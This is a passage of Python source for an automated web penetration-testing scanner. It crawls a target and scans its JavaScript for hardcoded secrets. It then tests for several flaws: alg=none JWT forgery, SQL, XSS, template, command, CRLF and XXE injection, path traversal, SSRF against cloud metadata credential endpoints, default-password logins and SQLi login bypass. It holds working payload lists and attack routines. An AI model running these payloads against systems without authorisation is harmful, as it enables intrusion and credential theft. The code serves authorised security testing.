    (re.compile(r'(?i)(api[_-]?key|apikey)\s*[:=]\s*["\']?([A-Za-z0-9\-_]{16,})'),      "API Key"),
    (re.compile(r'(?i)(secret[_-]?key|secret)\s*[:=]\s*["\']?([A-Za-z0-9\-_]{16,})'),   "Secret Key"),
    (re.compile(r'(?i)(password|passwd|pwd)\s*[:=]\s*["\']?([^\s"\']{6,})'),              "Password"),
    (re.compile(r'(?i)(access[_-]?token|auth[_-]?token)\s*[:=]\s*["\']?([A-Za-z0-9\-_.]{16,})'), "Access Token"),
    (re.compile(r'(?i)aws[_-]?access[_-]?key[_-]?id\s*[:=]\s*["\']?(AKIA[A-Z0-9]{16})'), "AWS Access Key"),
    (re.compile(r'["\']?(eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+)["\']?'), "JWT Token"),
    (re.compile(r'(?i)database[_-]?url\s*[:=]\s*["\']?((?:postgresql|mysql|mongodb)://[^\s"\']+)'), "Database URL"),
]
_INTERESTING_PATH_RE = re.compile(
    r'(?i)(/api/|/admin|/internal|/debug|/test|/backup|/old|/dev|/staging|/v\d+/)'
)


def _crawl_page(page_url: str, sess: requests.Session,
                timeout: int, base_url: str) -> dict:
    result = {"links": [], "forms": [], "js_files": [], "error": None}
    try:
        resp = sess.get(page_url, timeout=timeout, allow_redirects=True)
        ctype = resp.headers.get("Content-Type", "")
        if "text/html" not in ctype:
            return result
        if not _BS4_AVAILABLE:
            result["links"] = [
                _normalize_url(page_url, h)
                for h in re.findall(r'href=["\']([^"\']+)["\']', resp.text)
                if _normalize_url(page_url, h)
            ]
            return result
        soup = BeautifulSoup(resp.text, "html.parser")
        for tag in soup.find_all(["a", "link"]):
            href = tag.get("href", "")
            if href:
                norm = _normalize_url(page_url, href)
                if norm:
                    result["links"].append(norm)
        for form in soup.find_all("form"):
            action = form.get("action", "")
            method = form.get("method", "GET").upper()
            inputs = [
                {"name": i.get("name", ""), "type": i.get("type", "text")}
                for i in form.find_all(["input", "textarea", "select"])
                if i.get("name")
            ]
            result["forms"].append({
                "action": _normalize_url(page_url, action) if action else page_url,
                "method": method,
                "inputs": inputs,
            })
        for script in soup.find_all("script", src=True):
            src  = script.get("src", "")
            norm = _normalize_url(page_url, src) if src else None
            if norm and _same_origin(base_url, norm):
                result["js_files"].append(norm)
    except Exception as e:
        result["error"] = str(e)
    return result


def _phase_crawl(target: dict, cfg: dict, pm: ProgressManager,
                 out: OutputManager, sess: requests.Session) -> dict:
    phase     = "crawl"
    url       = target["url"]
    timeout   = cfg.get("timeout", 10)
    max_depth = cfg.get("crawl_depth", 3)
    max_pages = cfg.get("crawl_max_pages", 150)
    vc.status(phase, "Crawl", "running", "Crawling", 0, max_pages)

    visited:     set  = set()
    queue_urls:  list = [(url, 0)]
    all_forms:   list = []
    all_js:      list = []
    all_links:   list = []
    page_count         = 0

    while queue_urls and page_count < max_pages:
        current_url, depth = queue_urls.pop(0)
        _norm_cur = current_url.rstrip("/")
        if _norm_cur in visited:
            continue
        visited.add(_norm_cur)
        page_count += 1
        vc.status(phase, "Crawl", "running", f"Page {page_count}", page_count, max_pages)
        data = _crawl_page(current_url, sess, timeout, url)
        if data["error"]:
            continue
        all_forms.extend(data["forms"])
        all_js.extend(data["js_files"])
        all_links.extend(data["links"])
        if depth < max_depth:
            for link in data["links"]:
                if link.rstrip("/") not in visited and _same_origin(url, link):
                    queue_urls.append((link, depth + 1))

    vc.log(f"[crawl] Visited {page_count} pages, {len(all_forms)} forms, {len(all_js)} JS files", "INFO")
    crawl_out = out.output_path(phase, "crawl_results_" + target["hostname"])
    crawl_out.write_text(
        json.dumps({
            "pages_visited": page_count,
            "links": list(set(all_links))[:500],
            "forms": all_forms[:200],
            "js_files": list(set(all_js))[:100],
        }, indent=2),
        encoding="utf-8",
    )

    for link in set(all_links):
        if _INTERESTING_PATH_RE.search(link):
            out.add_finding(
                title="Interesting Endpoint Discovered",
                url=link, port=target["port"], risk="INFO",
                description=f"Potentially sensitive endpoint: {link}",
                sources="fracture-crawl", service=target["scheme"],
                affected=link, output_file=str(crawl_out),
                owasp="A04:2025 Insecure Design", nist="CM-7",
                remediation="Review this endpoint for access controls.",
            )

    vc.status(phase, "Crawl", "running", "JS secret scan", page_count, max_pages)
    for js_url in set(all_js):
        try:
            r = sess.get(js_url, timeout=timeout)
            _js_safe = re.sub(r'[^a-zA-Z0-9_-]', '_', js_url.replace("://", "_"))[:60]
            _js_out  = out.output_path(phase, f"js_{_js_safe}")
            _js_out.write_text(r.text[:30000], encoding="utf-8")
            for pat, secret_type in _SECRET_PATTERNS:
                m = pat.search(r.text)
                if m:
                    if _is_placeholder_secret(m.group(2)):
                        continue
                    out.add_finding(
                        title=f"Credentials/Secret in JavaScript: {secret_type}",
                        url=js_url, port=target["port"], risk="HIGH",
                        description=f"A {secret_type} was found hardcoded in JavaScript: {js_url}",
                        output=f"Match: {m.group(0)[:100]}",
                        sources="fracture-crawl", service=target["scheme"],
                        affected=js_url, output_file=str(_js_out),
                        owasp="A04:2025 Insecure Design", nist="IA-5",
                        remediation="Remove hardcoded secrets from JavaScript. Use server-side secrets management.",
                    )
                    vc.log(f"[crawl] Secret in JS: {secret_type} at {js_url}", "SUCCESS")
        except Exception:
            pass

    vc.status(phase, "Crawl", "complete", "Done", max_pages, max_pages)
    vc.log("[crawl] Phase complete", "SUCCESS")

    # Extract params for injection phases
    all_params: list = []
    for link in set(all_links):
        parsed = urllib.parse.urlparse(link)
        if parsed.query:
            pkeys = list(urllib.parse.parse_qs(parsed.query).keys())
            if pkeys:
                all_params.append({"url": link, "params": pkeys})

    return {"forms": all_forms, "params": all_params, "links": list(set(all_links))}


# ─────────────────────────────────────────────
# Phase 3b: JWT security testing
# ─────────────────────────────────────────────

_JWT_RE = re.compile(
    r'eyJ[A-Za-z0-9\-_]{10,}\.[A-Za-z0-9\-_]{10,}\.[A-Za-z0-9\-_]*'
)


def _phase_jwt(target: dict, cfg: dict, pm: ProgressManager,
               out: OutputManager, sess: requests.Session,
               crawl_data: dict) -> None:
    """Test JWT security across the target.

    Collection:
      - Main URL response body and Set-Cookie headers.
      - Crawled page bodies (from crawl_data["links"], capped at 30 pages).
      - Authorization / X-Auth-Token response headers.

    Tests:
      1. Algorithm identification — log header algorithm as an INFO finding.
      2. 'none' algorithm bypass — forge a token with alg=none, no signature,
         probe the same URL with Bearer auth; flag CRITICAL if server accepts it.
      3. jwt_tool — if available, run ``jwt_tool <token> -X a -np`` to confirm
         algorithm confusion attacks (-X a) without proxying (-np).

    Output saved to: jwt/<hostname>_<port>_jwt_tool.txt
    """
    phase   = "jwt"
    url     = target["url"]
    port    = target["port"]
    timeout = cfg.get("timeout", 10)

    vc.status(phase, "JWT", "running", "Token collection", 0, 3)

    found_tokens: set = set()

    # Collect from main URL response
    try:
        r = sess.get(url, timeout=timeout)
        for m in _JWT_RE.finditer(r.text):
            found_tokens.add(m.group(0))
        # Check response headers (some APIs put token in headers)
        for hdr in ("Authorization", "X-Auth-Token", "X-Access-Token"):
            hv = r.headers.get(hdr, "")
            for m in _JWT_RE.finditer(hv):
                found_tokens.add(m.group(0))
        # Check cookies
        for ck in r.cookies:
            for m in _JWT_RE.finditer(str(ck.value)):
                found_tokens.add(m.group(0))
    except Exception:
        pass

    # Collect from crawled pages
    for link in crawl_data.get("links", [])[:30]:
        try:
            r = sess.get(link, timeout=timeout)
            for m in _JWT_RE.finditer(r.text):
                found_tokens.add(m.group(0))
        except Exception:
            pass

    if not found_tokens:
        vc.log("[jwt] No JWT tokens found — skipping", "INFO")
        vc.status(phase, "JWT", "complete", "No tokens found", 3, 3)
        return

    vc.log(f"[jwt] {len(found_tokens)} JWT token(s) collected", "INFO")
    vc.status(phase, "JWT", "running", "Algorithm analysis", 1, 3)

    import base64 as _b64

    for token in list(found_tokens)[:5]:
        parts = token.split(".")
        if len(parts) != 3:
            continue
        try:
            # Decode header (base64url, pad to 4-byte boundary)
            hdr_raw  = parts[0] + "=" * (-len(parts[0]) % 4)
            hdr_json = json.loads(_b64.urlsafe_b64decode(hdr_raw).decode("utf-8", errors="replace"))
            alg      = hdr_json.get("alg", "unknown")

            out.add_finding(
                title=f"JWT Token Identified: Algorithm {alg}",
                url=url, port=port, risk="INFO",
                description=(
                    f"A JWT token using algorithm '{alg}' was identified in the "
                    f"application's traffic. Verify algorithm is appropriate "
                    f"(RS256/ES256 preferred over HS256; 'none' is insecure)."
                ),
                output=f"alg: {alg}\nHeader: {json.dumps(hdr_json)}",
                sources="fracture-jwt", service=target["scheme"],
                owasp="A07:2025 Identification and Authentication Failures", nist="IA-5",
                remediation=(
                    "Use asymmetric algorithms (RS256, ES256). "
                    "Validate algorithm server-side against a strict allowlist."
                ),
            )

            # ── Test 1: 'none' algorithm bypass ──────────────────────────────
            none_hdr_b64 = (
                _b64.urlsafe_b64encode(
                    json.dumps({**hdr_json, "alg": "none"}).encode()
                ).rstrip(b"=").decode()
            )
            none_token = f"{none_hdr_b64}.{parts[1]}."

            # Probe — compare authenticated vs unauthenticated status codes
            try:
                r_base  = sess.get(url, timeout=timeout)
                r_none  = sess.get(url, timeout=timeout,
                                   headers={"Authorization": f"Bearer {none_token}"})
                r_orig  = sess.get(url, timeout=timeout,
                                   headers={"Authorization": f"Bearer {token}"})
                # If 'none' token gives same 200 as original but base is 401/403 → vulnerable
                if (r_none.status_code == 200
                        and r_base.status_code in (401, 403)
                        and r_orig.status_code == 200):
                    out.add_finding(
                        title="JWT Vulnerability: 'none' Algorithm Accepted",
                        url=url, port=port, risk="CRITICAL",
                        description=(
                            "The server accepted a JWT with 'alg': 'none' and an empty "
                            "signature, bypassing cryptographic validation entirely. "
                            "An attacker can forge arbitrary token claims with no credentials. "
                            "CWE-347 (Improper Verification of Cryptographic Signature). "
                            "CVSS 9.8 CRITICAL (CVE-2015-9235)."
                        ),
                        output=(
                            f"Original alg: {alg}\n"
                            f"Base response: HTTP {r_base.status_code}\n"
                            f"Forged (none) response: HTTP {r_none.status_code}"
                        ),
                        sources="fracture-jwt", service=target["scheme"],
                        cves="CVE-2015-9235, CVE-2016-10555",
                        owasp="A07:2025 Identification and Authentication Failures", nist="IA-5",
                        remediation=(
                            "Explicitly reject tokens specifying 'alg': 'none'. "
                            "Validate the algorithm field against a server-side allowlist "
                            "before verifying the signature."
                        ),
                    )
                    vc.log("[jwt] CRITICAL: 'none' algorithm bypass confirmed!", "SUCCESS")
            except Exception:
                pass

        except Exception:
            continue

    # ── Test 2: jwt_tool ─────────────────────────────────────────────────────
    vc.status(phase, "JWT", "running", "jwt_tool", 2, 3)
    jwt_tool_bin = _find_tool("jwt_tool") or _find_tool("jwt_tool.py")
    if jwt_tool_bin and found_tokens:
        sample = next(iter(found_tokens))
        jt_out = out.output_path("jwt", f"jwt_tool_{target['hostname']}_{port}")
        if jwt_tool_bin.endswith(".py"):
            cmd = [sys.executable, jwt_tool_bin, sample, "-X", "a", "-np"]
        else:
            cmd = [jwt_tool_bin, sample, "-X", "a", "-np"]
        vc.log("[jwt] Running jwt_tool algorithm confusion test ...", "INFO")
        try:
            proc = _popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
            _register_proc(proc)
            stdout_jt, _ = proc.communicate(timeout=30)
            _deregister_proc(proc)
            jt_out.write_text(stdout_jt, encoding="utf-8", errors="replace")
            out.log_command("jwt_tool", cmd, jt_out)
            if re.search(r'RESULT.*VULNERABLE|successfully forged|VULNERABLE', stdout_jt, re.I):
                out.add_finding(
                    title="JWT Vulnerability Confirmed by jwt_tool",
                    url=url, port=port, risk="CRITICAL",
                    description=(
                        "jwt_tool confirmed a JWT algorithm confusion vulnerability. "
                        "CWE-347 (Improper Verification of Cryptographic Signature). "
                        "CVSS 9.8 CRITICAL (CVE-2015-9235)."
                    ),
                    output=stdout_jt[:2000], sources="jwt_tool",
                    service=target["scheme"], output_file=str(jt_out),
                    cves="CVE-2015-9235, CVE-2016-10555",
                    owasp="A07:2025 Identification and Authentication Failures", nist="IA-5",
                    remediation=(
                        "Validate algorithm server-side. Reject 'none' and weak HMAC "
                        "when asymmetric keys are expected."
                    ),
                )
        except Exception as e:
            out.log_error("jwt_tool", cmd, str(e))
    elif not jwt_tool_bin:
        vc.log("[jwt] jwt_tool not found — install jwt_tool for deeper testing", "WARNING")

    vc.status(phase, "JWT", "complete", "Done", 3, 3)
    vc.log("[jwt] Phase complete", "SUCCESS")


# ─────────────────────────────────────────────
# Phase 4: Injection
# ─────────────────────────────────────────────
_SQL_ERROR_RE = re.compile(
    r"(SQL syntax.*MySQL|Warning.*mysql_|MySQLSyntaxError|"
    r"valid MySQL result|ORA-\d{5}|Oracle.*Driver|"
    r"quoted string not properly terminated|Microsoft SQL Server|"
    r"Unclosed quotation mark|PostgreSQL.*ERROR|Warning.*pg_|"
    r"SQLite.*error|near \".+\": syntax error|"
    r"Exception.*System\.Data\.SqlClient|"
    r"You have an error in your SQL syntax)",
    re.IGNORECASE,
)
_XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'><img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
]
_SSTI_PAYLOADS = [
    ("{{7*7}}", "49"),
    ("${7*7}", "49"),
    ("#{7*7}", "49"),
    ("<%= 7*7 %>", "49"),
]
_CMD_PAYLOADS = [
    (";id",    re.compile(r'uid=\d+\(')),
    ("|id",    re.compile(r'uid=\d+\(')),
    ("&id",    re.compile(r'uid=\d+\(')),
    ("`id`",   re.compile(r'uid=\d+\(')),
]
_CRLF_PAYLOAD = "%0d%0aX-Injected-Fracture: test"


def _qs_inject(base_url: str, param: str, value: str,
               sess: requests.Session, timeout: int) -> "requests.Response | None":
    try:
        parsed = urllib.parse.urlparse(base_url)
        qs     = urllib.parse.parse_qs(parsed.query)
        qs[param] = [value]
        new_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
        return sess.get(new_url, timeout=timeout)
    except Exception:
        return None


def _phase_injection(target: dict, cfg: dict, pm: ProgressManager,
                     out: OutputManager, sess: requests.Session,
                     crawl_data: dict, fast: bool = False) -> None:
    phase   = "injection"
    url     = target["url"]
    timeout = cfg.get("timeout", 10)
    forms   = crawl_data.get("forms", [])
    params  = crawl_data.get("params", [])
    vc.status(phase, "Injection Testing", "running", "SQLi heuristic", 0, 7)

    # 1. URL param error-based SQLi
    for entry in params:
        purl = entry["url"]
        for param in entry["params"]:
            r = _qs_inject(purl, param, "test'", sess, timeout)
            if r and _SQL_ERROR_RE.search(r.text):
                out.add_finding(
                    title="SQL Injection (Error-Based)",
                    url=purl, port=target["port"], risk="CRITICAL",
                    description=f"SQL injection in parameter '{param}' via error-based detection.",
                    output=f"Parameter: {param}\nURL: {purl}",
                    sources="fracture-injection", service=target["scheme"],
                    affected=purl, owasp="A03:2025 Injection", nist="SI-10",
                    remediation="Use parameterised queries throughout the application.",
                )
                vc.log(f"[injection] SQLi: {purl} param={param}", "SUCCESS")

    vc.status(phase, "Injection Testing", "running", "Form SQLi", 1, 7)
    # 2. Form-based SQLi
    for form in forms[:20]:
        action = form.get("action", url)
        method = form.get("method", "GET")
        inputs = form.get("inputs", [])
        for inp in inputs:
            pname = inp.get("name", "")
            if not pname:
                continue
            data = {i["name"]: "test" for i in inputs if i.get("name")}
            data[pname] = "test'"
            try:
                r = sess.post(action, data=data, timeout=timeout) if method == "POST" \
                    else sess.get(action, params=data, timeout=timeout)
                if _SQL_ERROR_RE.search(r.text):
                    out.add_finding(
                        title="SQL Injection in Form (Error-Based)",
                        url=action, port=target["port"], risk="CRITICAL",
                        description=f"SQLi in form field '{pname}' at {action}.",
                        output=f"Form: {action}\nField: {pname}",
                        sources="fracture-injection", service=target["scheme"],
                        affected=action, owasp="A03:2025 Injection", nist="SI-10",
                        remediation="Use parameterised queries. Validate all inputs.",
                    )
            except Exception:
                pass

    # 3. sqlmap (non-fast)
    if not fast and params:
        sqlmap = _find_tool("sqlmap")
        if sqlmap:
            sq_timeout = cfg.get("sqlmap_timeout", 300)
            sample_url = params[0]["url"]
            sq_dir     = out.root / phase / "sqlmap"
            sq_dir.mkdir(exist_ok=True)
            cmd = [sqlmap, "-u", sample_url, "--batch", "--level=2", "--risk=2",
                   f"--timeout={sq_timeout}", f"--output-dir={sq_dir}",
                   "--random-agent", "--forms"]
            vc.log("[injection] Running sqlmap ...", "INFO")
            try:
                proc = _popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
                _register_proc(proc)
                stdout, _ = proc.communicate(timeout=sq_timeout + 60)
                _deregister_proc(proc)
                out.log_command("sqlmap", cmd, None)
                if re.search(r'Parameter.*is (vulnerable|injectable)', stdout, re.I):
                    out.add_finding(
                        title="SQL Injection Confirmed by sqlmap",
                        url=sample_url, port=target["port"], risk="CRITICAL",
                        description="sqlmap confirmed SQL injection.",
                        output=stdout[:2000], sources="sqlmap",
                        service=target["scheme"],
                        owasp="A03:2025 Injection", nist="SI-10",
                        remediation="Use parameterised queries across the application.",
                    )
            except Exception as e:
                out.log_error("sqlmap", cmd, str(e))

    vc.status(phase, "Injection Testing", "running", "XSS", 2, 7)
    # 4. Reflected XSS
    for entry in params[:10]:
        purl = entry["url"]
        for param in entry["params"]:
            for payload in _XSS_PAYLOADS[:3]:
                r = _qs_inject(purl, param, payload, sess, timeout)
                if r and payload in r.text:
                    out.add_finding(
                        title="Reflected Cross-Site Scripting (XSS)",
                        url=purl, port=target["port"], risk="HIGH",
                        description=f"Reflected XSS in parameter '{param}'.",
                        output=f"Parameter: {param}\nPayload: {payload}",
                        sources="fracture-injection", service=target["scheme"],
                        affected=purl, owasp="A03:2025 Injection", nist="SI-10",
                        remediation="Encode all user output. Implement CSP.",
                    )
                    vc.log(f"[injection] XSS: {purl} param={param}", "SUCCESS")
                    break

    # dalfox
    dalfox = _find_tool("dalfox")
    if dalfox and params:
        df_out = out.output_path(phase, "dalfox_" + target["hostname"])
        cmd    = [dalfox, "url", params[0]["url"], "--silence", "--output", str(df_out)]
        try:
            proc = _popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
            _register_proc(proc)
            stdout, _ = proc.communicate(timeout=120)
            _deregister_proc(proc)
            out.log_command("dalfox", cmd, df_out)
            if "POC" in stdout or "Reflected" in stdout:
                out.add_finding(
                    title="XSS Confirmed by dalfox",
                    url=params[0]["url"], port=target["port"], risk="HIGH",
                    description="dalfox confirmed XSS.",
                    output=stdout[:2000], sources="dalfox",
                    service=target["scheme"], output_file=str(df_out),
                    owasp="A03:2025 Injection", nist="SI-10",
                    remediation="Encode all user output. Implement CSP.",
                )
        except Exception as e:
            out.log_error("dalfox", cmd, str(e))

    vc.status(phase, "Injection Testing", "running", "SSTI", 3, 7)
    # 5. SSTI
    for entry in params[:10]:
        purl = entry["url"]
        for param in entry["params"]:
            for payload, expected in _SSTI_PAYLOADS:
                r = _qs_inject(purl, param, payload, sess, timeout)
                if r and expected in r.text:
                    out.add_finding(
                        title="Server-Side Template Injection (SSTI)",
                        url=purl, port=target["port"], risk="CRITICAL",
                        description=f"SSTI in parameter '{param}'. Payload '{payload}' evaluated server-side.",
                        output=f"Parameter: {param}\nPayload: {payload} → {expected}",
                        sources="fracture-injection", service=target["scheme"],
                        affected=purl, owasp="A03:2025 Injection", nist="SI-10",
                        remediation="Never pass user input to template engines unsanitised.",
                    )
                    vc.log(f"[injection] SSTI: {purl} param={param}", "SUCCESS")

    vc.status(phase, "Injection Testing", "running", "Command injection", 4, 7)
    # 6. Command injection
    for entry in params[:10]:
        purl = entry["url"]
        for param in entry["params"]:
            for cmd_pay, cmd_pat in _CMD_PAYLOADS:
                r = _qs_inject(purl, param, "test" + cmd_pay, sess, timeout)
                if r and cmd_pat.search(r.text):
                    out.add_finding(
                        title="OS Command Injection",
                        url=purl, port=target["port"], risk="CRITICAL",
                        description=f"Command injection in parameter '{param}'.",
                        output=f"Parameter: {param}\nPayload: {cmd_pay}",
                        sources="fracture-injection", service=target["scheme"],
                        affected=purl, owasp="A03:2025 Injection", nist="SI-10",
                        remediation="Never pass user input to OS calls.",
                    )
                    vc.log(f"[injection] CMDi: {purl} param={param}", "SUCCESS")

    vc.status(phase, "Injection Testing", "running", "CRLF", 5, 7)
    # 7. CRLF injection
    for entry in params[:10]:
        purl = entry["url"]
        for param in entry["params"]:
            r = _qs_inject(purl, param, _CRLF_PAYLOAD, sess, timeout)
            if r and ("X-Injected-Fracture" in r.text or "X-Injected-Fracture" in str(r.headers)):
                out.add_finding(
                    title="CRLF Injection",
                    url=purl, port=target["port"], risk="HIGH",
                    description=f"CRLF injection in parameter '{param}'.",
                    output=f"Parameter: {param}\nPayload: {_CRLF_PAYLOAD}",
                    sources="fracture-injection", service=target["scheme"],
                    owasp="A03:2025 Injection", nist="SI-10",
                    remediation="Strip CRLF characters from input used in HTTP headers.",
                )

    vc.status(phase, "Injection Testing", "running", "XXE", 6, 7)
    # 8. XXE — test on forms that might accept XML
    _xxe_payload = ('<?xml version="1.0"?><!DOCTYPE foo '
                    '[<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
                    '<foo>&xxe;</foo>')
    for form in forms[:10]:
        action = form.get("action", url)
        try:
            r = sess.post(action, data=_xxe_payload, timeout=timeout,
                          headers={"Content-Type": "application/xml"})
            if re.search(r'root:.*:/bin/', r.text):
                out.add_finding(
                    title="XML External Entity (XXE) Injection",
                    url=action, port=target["port"], risk="CRITICAL",
                    description=f"XXE injection confirmed at {action}. /etc/passwd content was returned.",
                    output=r.text[:500],
                    sources="fracture-injection", service=target["scheme"],
                    affected=action, owasp="A03:2025 Injection", nist="SI-10",
                    remediation="Disable external entity processing in XML parsers.",
                )
                vc.log(f"[injection] XXE at {action}", "SUCCESS")
        except Exception:
            pass

    vc.status(phase, "Injection Testing", "complete", "Done", 7, 7)
    vc.log("[injection] Phase complete", "SUCCESS")


# ─────────────────────────────────────────────
# Phase 5: Traversal
# ─────────────────────────────────────────────
_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "..%5c..%5c..%5cwindows%5cwin.ini",
]
_LFI_PARAMS = {"file", "page", "include", "path", "template", "view", "doc",
               "document", "load", "read", "content", "lang", "language", "module"}
_TRAVERSAL_RE = re.compile(r'root:.*:/bin/|daemon:.*:/usr/sbin|Win\.ini|\[boot loader\]', re.I)


def _phase_traversal(target: dict, cfg: dict, pm: ProgressManager,
                     out: OutputManager, sess: requests.Session,
                     crawl_data: dict) -> None:
    phase   = "traversal"
    timeout = cfg.get("timeout", 10)
    params  = crawl_data.get("params", [])
    vc.status(phase, "Path Traversal", "running", "Testing params", 0, len(params))

    for idx, entry in enumerate(params[:30]):
        purl = entry["url"]
        vc.status(phase, "Path Traversal", "running", "Testing", idx, len(params))
        for param in entry["params"]:
            is_lfi = param.lower() in _LFI_PARAMS
            payloads = _TRAVERSAL_PAYLOADS if is_lfi else _TRAVERSAL_PAYLOADS[:4]
            for payload in payloads:
                r = _qs_inject(purl, param, payload, sess, timeout)
                if r and _TRAVERSAL_RE.search(r.text):
                    out.add_finding(
                        title="Path Traversal / Local File Inclusion",
                        url=purl, port=target["port"], risk="HIGH",
                        description=f"Path traversal in parameter '{param}'. Payload caused file content disclosure.",
                        output=f"Parameter: {param}\nPayload: {payload}\nExcerpt: {r.text[:500]}",
                        sources="fracture-traversal", service=target["scheme"],
                        affected=f"{purl}?{param}=<traversal>",
                        owasp="A01:2025 Broken Access Control", nist="AC-3",
                        remediation="Validate file path inputs. Use allow-lists. Never use raw user input in filesystem operations.",
                    )
                    vc.log(f"[traversal] LFI: {purl} param={param}", "SUCCESS")
                    break

    vc.status(phase, "Path Traversal", "complete", "Done", len(params), len(params))
    vc.log("[traversal] Phase complete", "SUCCESS")


# ─────────────────────────────────────────────
# Phase 6: SSRF
# ─────────────────────────────────────────────
_SSRF_PARAMS = {"url", "redirect", "webhook", "callback", "next", "return",
                "image", "avatar", "fetch", "uri", "src", "host", "endpoint",
                "dest", "destination", "path", "data", "link", "target"}
_SSRF_PAYLOADS = [
    ("http://169.254.169.254/latest/meta-data/", "AWS metadata"),
    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IAM creds"),
    ("http://metadata.google.internal/computeMetadata/v1/", "GCP metadata"),
    ("http://100.100.100.200/latest/meta-data/", "Alibaba metadata"),
    ("http://127.0.0.1/", "Localhost"),
    ("http://localhost/", "Localhost (named)"),
    ("http://127.0.0.1:22/", "Localhost:22 (SSH)"),
    ("http://192.168.1.1/", "Internal gateway"),
    ("file:///etc/passwd", "File scheme LFI"),
]
_SSRF_RESPONSE_INDICATORS = re.compile(
    r'ami-id|instance-id|security-credentials|169\.254|computeMetadata|'
    r'root:.*:/bin/|OpenSSH|SSH-\d', re.I
)


def _phase_ssrf(target: dict, cfg: dict, pm: ProgressManager,
                out: OutputManager, sess: requests.Session,
                crawl_data: dict) -> None:
    phase   = "ssrf"
    url     = target["url"]
    timeout = cfg.get("timeout", 10)
    params  = crawl_data.get("params", [])
    vc.status(phase, "SSRF Testing", "running", "Param discovery", 0, len(params))

    ssrf_params = [(e["url"], p) for e in params for p in e["params"]
                   if p.lower() in _SSRF_PARAMS]

    for idx, (purl, param) in enumerate(ssrf_params):
        vc.status(phase, "SSRF Testing", "running", f"Testing {param}", idx, len(ssrf_params))
        for ssrf_payload, ssrf_desc in _SSRF_PAYLOADS:
            r = _qs_inject(purl, param, ssrf_payload, sess, timeout)
            if r and (r.status_code == 200 and len(r.text) > 10 or
                      _SSRF_RESPONSE_INDICATORS.search(r.text)):
                out.add_finding(
                    title=f"Server-Side Request Forgery (SSRF) — {ssrf_desc}",
                    url=purl, port=target["port"], risk="CRITICAL",
                    description=f"SSRF confirmed via parameter '{param}'. Target: {ssrf_payload}",
                    output=f"Parameter: {param}\nPayload: {ssrf_payload}\nResponse: {r.text[:500]}",
                    sources="fracture-ssrf", service=target["scheme"],
                    affected=f"{purl}?{param}={ssrf_payload}",
                    owasp="A10:2025 Server-Side Request Forgery", nist="SC-7",
                    remediation="Validate and restrict URLs supplied by users. Use an allowlist of permitted destinations.",
                )
                vc.log(f"[ssrf] SSRF via {param}: {ssrf_desc}", "SUCCESS")
                break

    vc.status(phase, "SSRF Testing", "complete", "Done", len(ssrf_params), len(ssrf_params))
    vc.log("[ssrf] Phase complete", "SUCCESS")


# ─────────────────────────────────────────────
# Phase 7: Auth Bypass
# ─────────────────────────────────────────────
_DEFAULT_CREDS = [
    ("admin",  "admin"),
    ("admin",  "password"),
    ("admin",  "123456"),
    ("admin",  "admin123"),
    ("admin",  "password123"),
    ("test",   "test"),
    ("root",   "root"),
    ("root",   "toor"),
    ("user",   "user"),
    ("guest",  "guest"),
    ("admin",  ""),
    ("",       "admin"),
]
_SQLI_BYPASS_PAYLOADS = [
    ("admin'--",    "anything"),
    ("' OR 1=1--",  "anything"),
    ("' OR '1'='1", "anything"),
    ("admin' #",    "anything"),
]


def _phase_auth_bypass(target: dict, cfg: dict, pm: ProgressManager,
                       out: OutputManager, sess: requests.Session,
                       crawl_data: dict) -> None:
    phase   = "auth_bypass"
    url     = target["url"]
    timeout = cfg.get("timeout", 10)
    forms   = crawl_data.get("forms", [])
    vc.status(phase, "Auth Bypass", "running", "Default credentials", 0, 4)

    # Shared evidence log for this phase — all findings reference this file
    auth_out = out.output_path(phase, "auth_bypass_" + target["hostname"])
    auth_out.write_text(
        f"# Auth Bypass Testing — {url}\n\n", encoding="utf-8"
    )

    # Find login forms
    login_forms = [f for f in forms if re.search(r'login|signin|auth', f.get("action", ""), re.I)
                   or any(i.get("type") == "password" for i in f.get("inputs", []))]

    for form in login_forms[:3]:
        action  = form.get("action", url)
        method  = form.get("method", "POST")
        inputs  = form.get("inputs", [])
        user_f  = next((i["name"] for i in inputs if re.search(r'user|email|login', i["name"], re.I)), None)
        pass_f  = next((i["name"] for i in inputs if i.get("type") == "password"), None)

        if not user_f or not pass_f:
            continue

        # 1. Default credentials
        for uname, pwd in _DEFAULT_CREDS:
            data = {i["name"]: "" for i in inputs if i.get("name")}
            data[user_f] = uname
            data[pass_f] = pwd
            try:
                r = sess.post(action, data=data, timeout=timeout, allow_redirects=True)
                # Heuristic: check if we're no longer on the login page
                if r.status_code in (200, 302) and not re.search(r'login|invalid|incorrect|failed|error', r.text, re.I):
                    with auth_out.open("a", encoding="utf-8") as _af:
                        _af.write(
                            f"## Default Credentials Accepted\n"
                            f"URL: {action}\nUsername: {uname}\nPassword: {pwd}\n"
                            f"Response: {r.status_code}\n{r.text[:2000]}\n\n"
                        )
                    out.add_finding(
                        title="Default Credentials Accepted",
                        url=action, port=target["port"], risk="CRITICAL",
                        description=f"Default credentials '{uname}'/'{pwd}' were accepted at {action}.",
                        output=f"Username: {uname}\nPassword: {pwd}\nResponse: {r.status_code}",
                        sources="fracture-auth-bypass", service=target["scheme"],
                        affected=action, output_file=str(auth_out),
                        owasp="A07:2025 Identification and Authentication Failures",
                        nist="IA-5",
                        remediation="Change default credentials. Enforce strong password policy.",
                    )
                    vc.log(f"[auth_bypass] Default creds: {uname}/{pwd}", "SUCCESS")
                    break
            except Exception:
                pass

        vc.status(phase, "Auth Bypass", "running", "SQLi login bypass", 1, 4)
        # 2. SQLi in login
        for usr_pay, pwd_pay in _SQLI_BYPASS_PAYLOADS:
            data = {i["name"]: "" for i in inputs if i.get("name")}
